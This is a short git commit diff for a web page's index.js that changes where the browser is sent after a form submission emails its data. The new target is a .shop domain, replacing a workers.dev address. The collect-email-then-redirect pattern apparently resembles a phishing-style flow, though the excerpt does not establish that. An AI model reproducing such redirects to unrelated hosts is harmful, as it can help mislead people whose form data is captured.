c4b528a132ca1f992c7e39c7b96d55a7a12f2275
husknet <127146284+husknet@users.noreply.github.com>
2024-08-13 06:34:45 -0300

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -42,7 +42,7 @@ export default function Home() {
           country,
         });
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://wild-wood-8ba8.hurtice.workers.dev/';
+        window.location.href = 'https://sg.kraut-testerburg.shop';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
